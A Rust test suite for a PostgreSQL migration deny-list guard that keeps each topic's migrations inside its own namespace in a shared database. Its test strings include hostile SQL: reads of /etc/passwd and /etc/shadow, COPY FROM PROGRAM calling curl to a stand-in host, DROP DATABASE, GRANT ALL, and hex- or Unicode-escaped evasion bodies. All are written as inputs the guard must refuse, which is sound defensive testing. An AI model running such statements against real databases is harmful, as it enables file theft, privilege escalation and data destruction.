//! The migration deny-list: what a topic's SQL may and may not do.
//!
//! These are the tests that matter most in this crate. A topic migration runs
//! in the **shared challenge database**, so a miss here is not a bug in one
//! topic — it is a path to rewriting another topic's rules, forging a
//! promotion, or dropping the tables the whole subnet's scoring reads.
//!
//! The suite is deliberately adversarial: it tries the spellings an attacker
//! would reach for (quoting, comments, dollar-quoted bodies, case, schema
//! qualification, `IF EXISTS`), and it asserts the *happy* path too, because
//! a guard that refuses everything is not a guard — it is an outage.

#![allow(clippy::unwrap_used, clippy::expect_used)]

use proof_topic_sql_guard::MigrationDenied;
use proof_topic_sql_guard::{
    blank_statements, check_migration, is_topic_scoped, split_statements, topic_sql_prefix,
    OWNED_TABLES,
};

const TOPIC: &str = "tb4";

/// Assert a migration is refused, naming `needle` in the refusal.
fn refused(sql: &str, needle: &str) {
    let err = check_migration(sql, TOPIC).expect_err(&format!("must refuse: {sql}"));
    let MigrationDenied { what, why, .. } = &err;
    let text = format!("{what} {why}");
    assert!(
        text.to_lowercase().contains(&needle.to_lowercase()),
        "{sql:?}: refusal must name {needle:?}, said {text:?}"
    );
}

/// Assert a migration is allowed.
fn allowed(sql: &str) {
    check_migration(sql, TOPIC).unwrap_or_else(|e| panic!("must allow {sql:?}: {e}"));
}

// ---------------------------------------------------------------------------
// The deny-list: every proof_* object is out of bounds
// ---------------------------------------------------------------------------

/// Every table this repository owns is refused by name, whatever the verb.
///
/// The enforcement is the `proof_` **prefix**, so a table a later migration
/// adds is protected without editing the guard. This test asserts the
/// readable list stays in step with the migrations, so a refusal can name the
/// object it refused.
#[test]
fn no_topic_migration_may_touch_a_proof_table() {
    for table in OWNED_TABLES {
        for sql in [
            format!("DROP TABLE {table}"),
            format!("ALTER TABLE {table} ADD COLUMN evil TEXT"),
            format!("TRUNCATE {table}"),
            format!("INSERT INTO {table} (topic_id) VALUES ('x')"),
            format!("UPDATE {table} SET topic_id = 'x'"),
            format!("DELETE FROM {table}"),
            format!("SELECT * FROM {table}"),
            format!("CREATE TABLE {table} (id TEXT)"),
            format!("CREATE INDEX ON {table} (topic_id)"),
        ] {
            let err = check_migration(&sql, TOPIC).expect_err(&format!("{sql:?} must be refused"));
            let MigrationDenied { what, why, .. } = &err;
            assert!(
                what.to_lowercase().contains(&table.to_lowercase())
                    || why.to_lowercase().contains("proof_"),
                "{sql:?}: refusal must name the object, said what={what:?} why={why:?}"
            );
        }
    }
}

/// A `proof_*` table that does not exist yet is still refused: the guard is
/// the prefix, not a list that a later migration could fall behind.
#[test]
fn an_unlisted_proof_table_is_still_refused() {
    for sql in [
        "SELECT * FROM proof_something_added_later",
        "DROP TABLE proof_future_table",
        "INSERT INTO proof_future_table (a) VALUES (1)",
        "ALTER TABLE proof_future_table ADD COLUMN b TEXT",
    ] {
        refused(sql, "proof_");
    }
}

/// The sqlx bookkeeping table and the roles are out of bounds too: a topic
/// that could rewrite `_sqlx_migrations` could make the next boot skip a
/// migration, and a topic that could `GRANT` could escalate.
#[test]
fn the_shared_databases_own_objects_are_refused() {
    for (sql, needle) in [
        ("DELETE FROM _sqlx_migrations", "_sqlx_migrations"),
        (
            "INSERT INTO _sqlx_migrations (version) VALUES (1)",
            "_sqlx_migrations",
        ),
        ("SELECT * FROM pg_roles", "pg_roles"),
        ("SELECT rolpassword FROM pg_authid", "pg_authid"),
        ("SELECT * FROM pg_catalog.pg_proc", "pg_catalog"),
        (
            "SELECT * FROM information_schema.tables",
            "information_schema",
        ),
    ] {
        refused(sql, needle);
    }
}

// ---------------------------------------------------------------------------
// Privilege escalation, escape, and destruction
// ---------------------------------------------------------------------------

/// Privilege and session control are refused: a topic migration is data
/// definition inside its own namespace, not administration.
#[test]
fn privilege_and_session_control_are_refused() {
    for sql in [
        "GRANT ALL ON SCHEMA public TO base_app",
        "GRANT SELECT ON tb4_scratch TO base_app",
        "REVOKE SELECT ON tb4_scratch FROM base_app",
        "SET ROLE base_app",
        "SET search_path TO public",
        "RESET ALL",
        "BEGIN",
        "COMMIT",
        "DISCARD ALL",
        "LISTEN channel",
        "NOTIFY channel",
    ] {
        let err = check_migration(sql, TOPIC).expect_err(sql);
        assert!(matches!(err, MigrationDenied { .. }), "{sql}: {err:?}");
    }
}

/// Dropping the database, a schema, a role, or an extension is refused, and
/// the refusal names the kind.
#[test]
fn dropping_shared_infrastructure_is_refused() {
    for (sql, needle) in [
        ("DROP DATABASE base", "DROP DATABASE"),
        ("DROP SCHEMA public CASCADE", "DROP SCHEMA"),
        ("DROP ROLE base_app", "DROP ROLE"),
        ("DROP OWNED BY base_app", "DROP OWNED"),
        ("DROP EXTENSION plpgsql", "DROP EXTENSION"),
        ("DROP TABLESPACE fast", "DROP TABLESPACE"),
    ] {
        refused(sql, needle);
    }
}

/// Server-side file access is refused: the database host's filesystem is not
/// a topic's to read.
#[test]
fn server_side_file_access_is_refused() {
    for (sql, needle) in [
        ("SELECT pg_read_file('/etc/passwd')", "pg_read_file"),
        (
            "SELECT pg_read_binary_file('/etc/shadow')",
            "pg_read_binary_file",
        ),
        ("SELECT pg_write_file('/tmp/x', 'y')", "pg_write_file"),
        ("SELECT pg_ls_dir('/root')", "pg_ls_dir"),
        ("SELECT lo_import('/etc/passwd')", "lo_import"),
        ("SELECT lo_export(1, '/tmp/x')", "lo_export"),
        (
            "SELECT pg_execute_server_program('curl evil.invalid')",
            "pg_execute_server_program",
        ),
    ] {
        refused(sql, needle);
    }
}

/// `COPY … PROGRAM` and `COPY … FROM` are both refused: one runs a shell
/// command, the other reads a host file.
#[test]
fn copy_is_refused_in_every_direction() {
    for sql in [
        "COPY tb4_scratch FROM '/etc/passwd'",
        "COPY tb4_scratch TO '/tmp/out'",
        "COPY tb4_scratch FROM PROGRAM 'curl evil.invalid'",
    ] {
        refused(sql, "COPY");
    }
}

/// A `SECURITY DEFINER` function runs as its owner, which is the migration
/// role. Refused.
#[test]
fn a_security_definer_function_is_refused() {
    for sql in [
        "CREATE FUNCTION tb4_f() RETURNS int AS $$ SELECT 1 $$ LANGUAGE sql SECURITY DEFINER",
        "CREATE FUNCTION tb4_f() RETURNS int SECURITY DEFINER AS 'SELECT 1' LANGUAGE sql",
    ] {
        refused(sql, "SECURITY");
    }
}

/// Maintenance verbs are refused: they take locks the scoring path does not
/// expect and can be used to stall a live challenge.
#[test]
fn maintenance_verbs_are_refused() {
    for sql in [
        "VACUUM tb4_scratch",
        "VACUUM FULL tb4_scratch",
        "CLUSTER tb4_scratch USING tb4_idx",
        "REINDEX TABLE tb4_scratch",
    ] {
        let err = check_migration(sql, TOPIC).expect_err(sql);
        assert!(matches!(err, MigrationDenied { .. }), "{sql}: {err:?}");
    }
}

// ---------------------------------------------------------------------------
// Namespace: a topic may only touch its own objects
// ---------------------------------------------------------------------------

/// A topic may not create, write, or read another topic's — or a shared —
/// object. This is what keeps one topic's install from colliding with the
/// next one's, or from reading a sibling's rows.
#[test]
fn a_topic_may_only_touch_its_own_namespace() {
    for sql in [
        "CREATE TABLE other_topic_scores (id TEXT)",
        "CREATE TABLE scores (id TEXT)",
        "CREATE TABLE miners (id TEXT)",
        "CREATE TABLE challenge_backends (id TEXT)",
        "CREATE TABLE public_scores (id TEXT)",
        "INSERT INTO other_topic_scores (id) VALUES ('x')",
        "UPDATE other_topic_scores SET id = 'x'",
        "DELETE FROM other_topic_scores",
        "SELECT * FROM other_topic_scores",
        "SELECT * FROM miners",
    ] {
        let err = check_migration(sql, TOPIC).expect_err(&format!("{sql:?} must be refused"));
        assert!(matches!(err, MigrationDenied { .. }), "{sql}: {err:?}");
    }
}

/// The topic's own namespace — `tb4_*` and `tb4.…` — is allowed, in every
/// verb a migration legitimately needs.
#[test]
fn a_topics_own_namespace_is_allowed() {
    for sql in [
        "CREATE TABLE tb4_scratch (id TEXT)",
        "CREATE TABLE tb4_scores (id TEXT, value DOUBLE PRECISION)",
        "CREATE INDEX tb4_scratch_idx ON tb4_scratch (id)",
        "ALTER TABLE tb4_scratch ADD COLUMN note TEXT",
        "INSERT INTO tb4_scratch (id) VALUES ('a')",
        "UPDATE tb4_scratch SET note = 'b' WHERE id = 'a'",
        "DELETE FROM tb4_scratch WHERE id = 'a'",
        "SELECT id FROM tb4_scratch",
        "CREATE TABLE tb4.runs (id TEXT)",
        "CREATE TYPE tb4_state AS ENUM ('open', 'closed')",
        "CREATE SEQUENCE tb4_seq",
        "TRUNCATE tb4_scratch",
        "CREATE VIEW tb4_view AS SELECT id FROM tb4_scratch",
    ] {
        allowed(sql);
    }
    // A sibling topic's namespace is not the topic's, even though it looks
    // similar: the prefix has to match the topic's own id.
    assert!(is_topic_scoped("tb4_scratch", "tb4"));
    assert!(is_topic_scoped("tb4.runs", "tb4"));
    assert!(!is_topic_scoped("tb40_scratch", "tb4"));
    assert!(!is_topic_scoped("tb_scratch", "tb4"));
    assert!(!is_topic_scoped("", "tb4"));
}

/// A real topic id is a **hyphen slug**, and a bare SQL identifier cannot
/// contain a hyphen — so the guard has to accept the identifier-safe spelling
/// or no real topic could ever install a migration.
///
/// The defect this pins: the guard required a literal `{topic_id}_` prefix.
/// Every live topic id is `[a-z0-9][a-z0-9-]{1,62}`, so the requirement was
/// unsatisfiable: `CREATE TABLE fixture-topic-v0_scratch` is a syntax error at
/// the first `-`, and the underscore spelling was refused. `--drive-rlm` would
/// provision the VM, run the paid baseline, and only then fail the install on
/// the deny-list — a paid run that could never publish.
#[test]
fn a_hyphenated_topic_id_has_an_identifier_safe_namespace() {
    // The mapping is `-` → `_`. It is injective **over legal ids**: an id
    // cannot contain an underscore (`[a-z0-9][a-z0-9-]{1,62}`), so two
    // different real ids cannot collide on one prefix.
    assert_eq!(topic_sql_prefix("fixture-topic-v0"), "fixture_topic_v0");
    assert_eq!(topic_sql_prefix("tb4"), "tb4");
    assert_ne!(
        topic_sql_prefix("a-b"),
        topic_sql_prefix("a-b-c"),
        "different ids map to different prefixes"
    );

    // The identifier-safe spelling is inside the topic's namespace…
    assert!(is_topic_scoped(
        "fixture_topic_v0_scratch",
        "fixture-topic-v0"
    ));
    assert!(is_topic_scoped("fixture_topic_v0.runs", "fixture-topic-v0"));
    // …the literal spelling stays accepted where it is legal (quoted / schema)
    assert!(is_topic_scoped("fixture-topic-v0.runs", "fixture-topic-v0"));
    // …and a sibling is still refused, in both spellings.
    assert!(!is_topic_scoped(
        "fixture_topic_v1_scratch",
        "fixture-topic-v0"
    ));
    assert!(!is_topic_scoped("other_topic_scratch", "fixture-topic-v0"));
    assert!(!is_topic_scoped("topic_scratch", "fixture-topic-v0"));
}

/// The whole pipeline, end to end: a hyphenated topic's migration is
/// **allowed**, and a sibling's table is still refused.
#[test]
fn a_hyphenated_topics_migration_is_admitted() {
    let topic = "fixture-topic-v0";
    // The exact statement the operator fixture carries.
    allowed_for("CREATE TABLE fixture_topic_v0_scratch (id TEXT)", topic);
    allowed_for(
        "CREATE INDEX fixture_topic_v0_scratch_id ON fixture_topic_v0_scratch (id)",
        topic,
    );
    allowed_for(
        "INSERT INTO fixture_topic_v0_scratch (id) VALUES ('a')",
        topic,
    );

    // A sibling topic's table is not this topic's, however similar.
    for sql in [
        "CREATE TABLE fixture_topic_v1_scratch (id TEXT)",
        "CREATE TABLE topic_scratch (id TEXT)",
        "SELECT id FROM proof_rule_version",
    ] {
        assert!(
            check_migration(sql, topic).is_err(),
            "{sql:?} must be refused for {topic}"
        );
    }
}

/// [`allowed`], for an arbitrary topic id.
fn allowed_for(sql: &str, topic: &str) {
    check_migration(sql, topic)
        .unwrap_or_else(|e| panic!("{sql:?} must be allowed for {topic}: {e}"));
}

/// A quoted identifier still names an object, so quoting cannot smuggle a
/// denied table past the scanner.
#[test]
fn quoted_identifiers_cannot_smuggle_a_denied_object() {
    for sql in [
        r#"SELECT * FROM "proof_rule_version""#,
        r#"DROP TABLE "proof_topic_version""#,
        r#"INSERT INTO "other_topic_scores" (a) VALUES (1)"#,
        r#"CREATE TABLE "scores" (id TEXT)"#,
    ] {
        let err = check_migration(sql, TOPIC).expect_err(&format!("{sql:?} must be refused"));
        assert!(matches!(err, MigrationDenied { .. }), "{sql}: {err:?}");
    }
}

// ---------------------------------------------------------------------------
// Evasion attempts
// ---------------------------------------------------------------------------

/// A denied word inside a string literal is **data**, not a statement: a
/// migration that stores the text `"DROP DATABASE"` must still install.
#[test]
fn a_denied_word_inside_a_literal_is_not_a_refusal() {
    allowed("INSERT INTO tb4_notes (body) VALUES ('DROP DATABASE base; GRANT ALL')");
    allowed("INSERT INTO tb4_notes (body) VALUES ('proof_topic_version')");
    allowed("CREATE TABLE tb4_notes (body TEXT DEFAULT 'pg_read_file')");
    allowed("INSERT INTO tb4_notes (body) VALUES ('other_topic_scores')");
}

/// A denied statement inside a comment is not a statement either.
#[test]
fn a_denied_statement_inside_a_comment_is_not_a_refusal() {
    allowed("-- DROP DATABASE base\nSELECT 1 FROM tb4_scratch");
    allowed("/* GRANT ALL ON SCHEMA public TO base_app */\nSELECT 1 FROM tb4_scratch");
    allowed("/* nested /* GRANT */ still a comment */ SELECT 1 FROM tb4_scratch");
}

/// Case and whitespace do not evade the scanner.
#[test]
fn case_and_whitespace_do_not_evade_the_guard() {
    for sql in [
        "drop database base",
        "DrOp DaTaBaSe base",
        "DROP\n\tDATABASE\nbase",
        "  DROP   SCHEMA   public  ",
        "grant all on tb4_scratch to base_app",
        "sElEcT * FrOm PrOoF_rUlE_vErSiOn",
    ] {
        let err = check_migration(sql, TOPIC).expect_err(sql);
        assert!(matches!(err, MigrationDenied { .. }), "{sql}: {err:?}");
    }
}

/// A dollar-quoted function body is scanned, not trusted: a denied object
/// inside it is still refused, because the body is what runs.
#[test]
fn a_dollar_quoted_body_is_scanned_not_trusted() {
    refused(
        "CREATE FUNCTION tb4_f() RETURNS void AS $$ DELETE FROM proof_rule_version $$ LANGUAGE sql",
        "proof_",
    );
    refused(
        "CREATE FUNCTION tb4_f() RETURNS void AS $body$ GRANT ALL ON tb4_x TO base_app $body$ LANGUAGE sql",
        "GRANT",
    );
}

/// A **single-quoted** function body is scanned too.
///
/// `PostgreSQL` accepts a function body as a string literal:
///
/// ```sql
/// CREATE FUNCTION f() RETURNS void AS 'DELETE FROM proof_rule_version' LANGUAGE sql;
/// ```
///
/// A string literal is normally *data*, so the scanner blanks it — which
/// would have let a topic install a function reaching a protected object
/// simply by wrapping the statement in `AS '…'`. The body of a function
/// definition is code, so it is decoded and scanned as well.
#[test]
fn a_single_quoted_function_body_is_scanned_not_trusted() {
    refused(
        "CREATE FUNCTION tb4_f() RETURNS void AS 'DELETE FROM proof_rule_version' LANGUAGE sql",
        "proof_",
    );
    refused(
        "CREATE FUNCTION tb4_f() RETURNS void AS 'GRANT ALL ON tb4_x TO base_app' LANGUAGE sql",
        "GRANT",
    );
    refused(
        "CREATE FUNCTION tb4_f() RETURNS void AS 'DROP DATABASE base' LANGUAGE sql",
        "DROP DATABASE",
    );
    refused(
        "CREATE FUNCTION tb4_f() RETURNS void AS 'SELECT pg_read_file($$/etc/passwd$$)' LANGUAGE sql",
        "pg_read_file",
    );
    // A literal that is *not* a function body stays data: a topic may store
    // the text of a denied statement without executing it.
    allowed("INSERT INTO tb4_notes (body) VALUES ('DELETE FROM proof_rule_version')");
    // And a function body that stays inside the topic's namespace is fine.
    allowed("CREATE FUNCTION tb4_f() RETURNS void AS 'INSERT INTO tb4_log (m) VALUES ($$ok$$)' LANGUAGE sql");
}

/// A doubled quote inside a single-quoted body is decoded before scanning, so
/// an escaped spelling cannot hide a denied statement.
#[test]
fn an_escaped_quote_in_a_function_body_does_not_hide_a_denied_statement() {
    refused(
        "CREATE FUNCTION tb4_f() RETURNS void AS 'SELECT ''x''; DROP TABLE proof_topic_version;' LANGUAGE sql",
        "proof_",
    );
    refused(
        "CREATE FUNCTION tb4_f() RETURNS void AS 'SELECT ''pg_read_file''; SELECT pg_read_file($$/etc/passwd$$)' LANGUAGE sql",
        "pg_read_file",
    );
}

/// An `E'…'` escape string is **decoded** before its body is scanned, because
/// the decoded value is what `PostgreSQL` executes: `\x44ELETE` is `DELETE`.
///
/// Without the decoding the scanner would read the written spelling, see no
/// denied word, and install a function that reaches a protected object.
#[test]
fn an_escape_string_body_is_decoded_before_scanning() {
    // `\x44` is `D`, `\x5f` is `_`: the whole denied name can be spelled in
    // escapes, so the written text never contains it.
    refused(
        r"CREATE FUNCTION tb4_f() RETURNS void AS E'\x44ELETE FROM proof\x5frule\x5fversion' LANGUAGE sql",
        "proof_",
    );
    refused(
        r"CREATE FUNCTION tb4_f() RETURNS void AS E'\x44ROP DATABASE base' LANGUAGE sql",
        "DROP DATABASE",
    );
    // Octal (`\107` is `G`), and the `\u` / `\U` code-point spellings.
    refused(
        r"CREATE FUNCTION tb4_f() RETURNS void AS E'\107RANT ALL ON tb4_x TO base_app' LANGUAGE sql",
        "GRANT",
    );
    refused(
        r"CREATE FUNCTION tb4_f() RETURNS void AS E'\u0044ELETE FROM proof\x5frule\x5fversion' LANGUAGE sql",
        "proof_",
    );
    refused(
        r"CREATE FUNCTION tb4_f() RETURNS void AS E'\U00000044ELETE FROM proof\x5frule\x5fversion' LANGUAGE sql",
        "proof_",
    );
    // A backslash-escaped quote does not end the body early, so the statement
    // after it is still part of the body the server runs.
    refused(
        r"CREATE FUNCTION tb4_f() RETURNS void AS E'SELECT \x27x\x27; DELETE FROM proof\x5frule\x5fversion' LANGUAGE sql",
        "proof_",
    );
    // The same escapes inside a `DO` body, which is a literal body too.
    refused(r"DO E'\x44ROP TABLE proof\x5ftopic\x5fversion'", "proof_");
}

/// A `U&'…'` Unicode escape string is decoded too, including the `UESCAPE`
/// clause that renames the escape character.
#[test]
fn a_unicode_escape_string_body_is_decoded_before_scanning() {
    refused(
        r"CREATE FUNCTION tb4_f() RETURNS void AS U&'\0044ELETE FROM proof\005frule\005fversion' LANGUAGE sql",
        "proof_",
    );
    refused(
        r"CREATE FUNCTION tb4_f() RETURNS void AS U&'\+000044ROP DATABASE base' LANGUAGE sql",
        "DROP DATABASE",
    );
    // `UESCAPE '!'` makes `!` the escape character, so a body spelled with
    // `!0044` is `DELETE` — the reading has to follow the clause.
    refused(
        r"CREATE FUNCTION tb4_f() RETURNS void AS U&'!0044ELETE FROM proof!005frule!005fversion' UESCAPE '!' LANGUAGE sql",
        "proof_",
    );
    // A doubled escape character is one literal escape character.
    refused(
        r"CREATE FUNCTION tb4_f() RETURNS void AS U&'SELECT \\x27; DROP DATABASE base' LANGUAGE sql",
        "DROP DATABASE",
    );
}

/// `CREATE PROCEDURE … AS '…'` and `DO '…'` carry code in a literal exactly
/// as `CREATE FUNCTION … AS '…'` does, so they are scanned the same way.
#[test]
fn every_literal_body_form_is_scanned() {
    refused(
        "CREATE PROCEDURE tb4_p() AS 'DELETE FROM proof_rule_version' LANGUAGE sql",
        "proof_",
    );
    refused(
        r"CREATE PROCEDURE tb4_p() AS E'\x44ROP DATABASE base' LANGUAGE sql",
        "DROP DATABASE",
    );
    refused("DO 'DELETE FROM proof_rule_version'", "proof_");
    refused(
        "DO LANGUAGE plpgsql 'GRANT ALL ON tb4_x TO base_app'",
        "GRANT",
    );
    // `ON CONFLICT … DO UPDATE …` is a write whose literals are data: the
    // `DO` test is a statement-head test, not a word search.
    allowed("INSERT INTO tb4_scratch (id) VALUES ('DELETE FROM proof_rule_version') ON CONFLICT (id) DO UPDATE SET id = 'b'");
}

/// Two literals separated by whitespace containing a newline are **one**
/// string to `PostgreSQL`, so a denied name split across them is still refused.
#[test]
fn literals_postgresql_concatenates_are_scanned_as_one() {
    refused(
        "CREATE FUNCTION tb4_f() RETURNS void AS 'DROP TABLE proof'\n'_topic_version' LANGUAGE sql",
        "proof_",
    );
    refused(
        "CREATE FUNCTION tb4_f() RETURNS void AS 'GRANT ALL ON tb4_x'\n' TO base_app' LANGUAGE sql",
        "GRANT",
    );
    // Without the newline `PostgreSQL` does not concatenate them (and refuses
    // the statement), so the topic's own namespace is still allowed.
    allowed("CREATE FUNCTION tb4_f() RETURNS void AS 'SELECT 1 FROM tb4_scratch' LANGUAGE sql");
}

/// The decoding is for **code**, not for data: an escape string a migration
/// merely stores stays a literal, and a body that keeps to the topic's own
/// namespace is still allowed.
#[test]
fn an_escape_string_that_is_data_stays_data() {
    allowed(r"INSERT INTO tb4_notes (body) VALUES (E'\x44ROP DATABASE base')");
    allowed(r"INSERT INTO tb4_notes (body) VALUES (U&'\0044ELETE FROM proof_rule_version')");
    allowed(
        r"CREATE FUNCTION tb4_f() RETURNS void AS E'INSERT INTO tb4_log (m) VALUES (\x27ok\x27)' LANGUAGE sql",
    );
    allowed(
        r"CREATE FUNCTION tb4_f() RETURNS text AS E'SELECT ''it\''s'' FROM tb4_scratch' LANGUAGE sql",
    );
}

/// The generic `topic_` prefix is **not** an isolation boundary.
///
/// Every topic shares one database, so a bare `topic_scores` is one table that
/// every topic's install can reach: approving it for topic A would let A
/// write, truncate, or redefine the table B created. Only the topic's own
/// namespace counts.
#[test]
fn the_generic_topic_prefix_is_not_a_shared_namespace() {
    for sql in [
        "CREATE TABLE topic_scores (id TEXT)",
        "UPDATE topic_victim_private SET value = 'compromised'",
        "DELETE FROM topic_victim_private",
        "TRUNCATE topic_shared",
        "DROP TABLE topic_scores",
        "INSERT INTO topic_scores (id) VALUES ('x')",
        "ALTER TABLE topic_scores ADD COLUMN evil TEXT",
    ] {
        let err = check_migration(sql, TOPIC).expect_err(&format!("{sql:?} must be refused"));
        assert!(matches!(err, MigrationDenied { .. }), "{sql}: {err:?}");
    }
    // The topic's own namespace is still the topic's.
    allowed("CREATE TABLE tb4_scores (id TEXT)");
    allowed("CREATE TABLE tb4.topic_scores (id TEXT)");
    assert!(!is_topic_scoped("topic_scores", "tb4"));
    assert!(!is_topic_scoped("topic_scratch", "tb4"));
    assert!(is_topic_scoped("tb4_scratch", "tb4"));
    assert!(is_topic_scoped("tb4.topic_scratch", "tb4"));
}

/// One topic's namespace is not another's, whatever the prefix resembles.
#[test]
fn a_sibling_topics_namespace_is_refused() {
    for (sql, topic) in [
        ("UPDATE tb4_scores SET value = 'x'", "tb9"),
        ("SELECT * FROM tb9_scratch", "tb4"),
        ("DELETE FROM tb4_log", "tb40"),
        ("INSERT INTO tb4_runs (a) VALUES (1)", "tb"),
    ] {
        let err = check_migration(sql, topic).expect_err(&format!("{sql:?} for {topic:?}"));
        assert!(
            matches!(err, MigrationDenied { .. }),
            "{sql:?} for {topic:?}: {err:?}"
        );
    }
    // The same statement is legal for the topic that owns the namespace.
    allowed("UPDATE tb4_scores SET value = 'x'");
    allowed("SELECT * FROM tb4_scratch");
}

/// A multi-statement migration is refused as a whole: the ordinal names the
/// offending statement, and the good statements before it do not save it.
#[test]
fn a_denied_statement_refuses_the_whole_migration_and_names_its_ordinal() {
    let sql = "CREATE TABLE tb4_ok (id TEXT); INSERT INTO tb4_ok (id) VALUES ('a'); \
               DROP TABLE proof_rule_version;";
    let err = check_migration(sql, TOPIC).expect_err("third statement is denied");
    let MigrationDenied { ordinal, what, .. } = err;
    assert_eq!(ordinal, 3, "the refusal must name the offending statement");
    assert!(what.contains("proof_"), "{what}");

    // And a migration that is legal end to end is allowed, so the guard is
    // not simply refusing everything with a semicolon in it.
    allowed("CREATE TABLE tb4_a (id TEXT); CREATE TABLE tb4_b (id TEXT);");
}

/// An empty migration installs nothing, which is a bundle mistake rather than
/// a security event — but it is still refused, because a step that does
/// nothing should not be in a bundle.
#[test]
fn an_empty_migration_is_refused() {
    for sql in ["", "   ", "\n\n", "-- only a comment\n", "/* nothing */"] {
        let err = check_migration(sql, TOPIC).expect_err(sql);
        assert!(matches!(err, MigrationDenied { .. }), "{sql:?}: {err:?}");
    }
}

// ---------------------------------------------------------------------------
// The scanner itself
// ---------------------------------------------------------------------------

/// The splitter keeps statement text executable and the blanked copy
/// scannable: literals survive in `text` (or the migration would not work)
/// and are gone from `blanked` (or a literal would be a false refusal).
#[test]
fn the_splitter_keeps_executable_text_and_blanks_for_scanning() {
    let statements = split_statements(
        "CREATE TABLE tb4_a (b TEXT DEFAULT 'DROP DATABASE base'); \
         INSERT INTO tb4_a (b) VALUES ('x;y');",
    );
    assert_eq!(
        statements.len(),
        2,
        "a semicolon inside a literal is not a split"
    );
    assert!(
        statements[0].text.contains("DROP DATABASE base"),
        "the executable text keeps the literal: {}",
        statements[0].text
    );
    assert!(
        !statements[0].blanked.contains("DROP DATABASE"),
        "the scanned copy must not see the literal: {}",
        statements[0].blanked
    );
    assert!(
        statements[1].text.contains("'x;y'"),
        "{}",
        statements[1].text
    );
    assert_eq!(statements[0].ordinal, 1);
    assert_eq!(statements[1].ordinal, 2);

    // A doubled quote is an escaped quote, not the end of the literal.
    let quoted = split_statements("INSERT INTO tb4_a (b) VALUES ('it''s; fine')");
    assert_eq!(quoted.len(), 1);
    assert!(quoted[0].text.contains("it''s; fine"), "{}", quoted[0].text);
}

/// Word matching is on boundaries: a column named `granted` or a table named
/// `proofish` is not a `GRANT` or a `proof_` object.
#[test]
fn word_matching_respects_boundaries() {
    allowed("CREATE TABLE tb4_granted (id TEXT)");
    allowed("INSERT INTO tb4_granted (id) VALUES ('x')");
    allowed("CREATE TABLE tb4_vacuumed (id TEXT)");
    // `proofish` does not carry the `proof_` prefix.
    allowed("CREATE TABLE tb4_proofish (id TEXT)");
    // An actual proof_ object does.
    refused("SELECT * FROM proof_topic_version", "proof_");

    // A name that merely *contains* `proof_` but sits inside the topic's own
    // namespace is the topic's own table, not the repository's: PostgreSQL
    // resolves by exact name, so `tb4_proof_topic_version` cannot shadow
    // `proof_topic_version`. The guard checks the base name's prefix, not a
    // substring, and this is the case that pins that distinction.
    allowed("CREATE TABLE tb4_proof_topic_version (id TEXT)");
    refused("SELECT * FROM proof_topic_version", "proof_topic_version");
}

/// `UPDATE … SET …` is not a session `SET`: the statement-head rule must not
/// produce a false refusal on the most ordinary write there is.
#[test]
fn an_update_set_is_not_a_session_set() {
    allowed("UPDATE tb4_scratch SET note = 'x' WHERE id = 'a'");
    allowed("INSERT INTO tb4_scratch (id) VALUES ('a') ON CONFLICT (id) DO UPDATE SET id = 'b'");
    refused("SET search_path TO evil", "SET");
    refused("SET ROLE base_app", "SET");
}

/// The blanked form is what the guard reads, and it is available to a caller
/// that only wants to scan.
#[test]
fn the_blanked_form_is_available_and_free_of_literals() {
    let blanked = blank_statements("SELECT 'secret literal' FROM tb4_scratch");
    assert_eq!(blanked.len(), 1);
    assert!(!blanked[0].contains("secret"), "{}", blanked[0]);
    assert!(blanked[0].contains("tb4_scratch"), "{}", blanked[0]);
}

/// `CREATE TABLE IF NOT EXISTS` is recognised: the object after the keyword
/// is the name, not `IF`.
#[test]
fn if_not_exists_is_recognised_as_the_same_statement() {
    allowed("CREATE TABLE IF NOT EXISTS tb4_scratch (id TEXT)");
    refused(
        "CREATE TABLE IF NOT EXISTS other_topic_scratch (id TEXT)",
        "other_topic_scratch",
    );
    refused(
        "CREATE TABLE IF NOT EXISTS proof_rule_version (id TEXT)",
        "proof_",
    );
}

/// A table function is not a table: `generate_series(…)` in a `FROM` must not
/// be mistaken for an object outside the topic's namespace.
#[test]
fn a_table_function_is_not_treated_as_a_table() {
    allowed("SELECT g FROM generate_series(1, 10) AS g");
    allowed("INSERT INTO tb4_scratch (id) SELECT g::text FROM generate_series(1, 3) AS g");
}
